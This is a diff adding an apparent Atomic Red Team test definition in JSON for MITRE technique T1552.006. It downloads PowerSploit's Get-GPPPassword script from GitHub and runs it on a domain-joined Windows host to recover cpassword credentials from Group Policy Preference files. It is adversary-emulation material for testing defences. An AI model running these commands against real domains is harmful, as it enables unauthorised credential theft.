@@ -1,0 +1,46 @@
+{
+    "name": "GPP Passwords (Get-GPPPassword)",
+    "description": "Look for the encrypted cpassword value within Group Policy Preference files on the Domain Controller. This test is intended to be run from a domain joined workstation, not on the Domain Controller itself. The Get-GPPPasswords.ps1 executed during this test can be obtained using the get-prereq_commands.  Successful test execution will either display the credentials found in the GPP files or indicate No preference files found. ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "dependency_executor_name": "powershell",
+    "executor": {
+        "command": ". \"#{gpp_script_path}\"\nGet-GPPPassword -Verbose\n",
+        "name": "powershell",
+        "type": "Command Executor"
+    },
+    "id": "T1552.006",
+    "tactics": [
+        "Credential Access"
+    ],
+    "technique": "Group Policy Preferences",
+    "source": "ART",
+    "uuid": "e9584f82-322c-474a-b831-940fd8b4455c",
+    "arguments": {
+        "gpp_script_url": {
+            "description": "URL of the Get-GPPPassword PowerShell Script",
+            "type": "url",
+            "default": "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/87630cac639f29c2adcb163f661f02890adf4bdd/Exfiltration/Get-GPPPassword.ps1"
+        },
+        "gpp_script_path": {
+            "description": "Path to the Get-GPPPassword PowerShell Script",
+            "type": "path",
+            "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\Get-GPPPassword.ps1"
+        }
+    },
+    "preconditions": [
+        {
+            "description": "Get-GPPPassword PowerShell Script must exist at #{gpp_script_path}\n",
+            "prereq_command": "if(Test-Path \"#{gpp_script_path}\") {exit 0 } else {exit 1 }\n",
+            "get_prereq_command": "New-Item -ItemType Directory (Split-Path \"#{gpp_script_path}\") -Force | Out-Null\nInvoke-WebRequest #{gpp_script_url} -OutFile \"#{gpp_script_path}\"\n"
+        },
+        {
+            "description": "Computer must be domain joined\n",
+            "prereq_command": "if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}\n",
+            "get_prereq_command": "Write-Host Joining this computer to a domain must be done manually\n"
+        }
+    ],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
